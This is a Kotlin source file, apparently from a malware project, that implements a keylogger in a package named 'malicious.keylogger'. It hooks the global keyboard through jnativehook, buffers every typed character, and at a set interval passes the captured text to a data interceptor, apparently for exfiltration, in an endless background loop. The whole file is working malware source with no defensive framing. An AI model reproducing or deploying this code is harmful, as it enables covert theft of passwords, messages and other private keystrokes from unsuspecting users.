package malicious.keylogger


import com.github.kwhat.jnativehook.GlobalScreen
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.coroutineScope
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.serialization.Serializable
import malicious.interceptors.DataInterceptor

class KeyLogger(
    private val collectionIntervalSeconds: Int,
    private val interceptor: DataInterceptor,
) : NativeKeyListener {

    var inputBuffer: StringBuilder = StringBuilder()

    init {
        GlobalScreen.registerNativeHook()
        GlobalScreen.addNativeKeyListener(this)
    }

    override fun nativeKeyTyped(nativeEvent: NativeKeyEvent?) {
        inputBuffer.append(nativeEvent?.keyChar)
    }

    suspend fun collectKeyloggerData() {
        coroutineScope {
            launch(Dispatchers.IO) {
                while(true) {
                    delay(collectionIntervalSeconds * 1000L)
                    sendCollectedKeyloggerData()
                }
            }
        }
    }

    private suspend fun sendCollectedKeyloggerData() {
        val data = inputBuffer.toString()
        interceptor.onData(KeyloggerData(data))
        inputBuffer.clear()
    }
}

@Serializable
data class KeyloggerData(
    val collectedData: String,
    val type: String = "keylogger",
)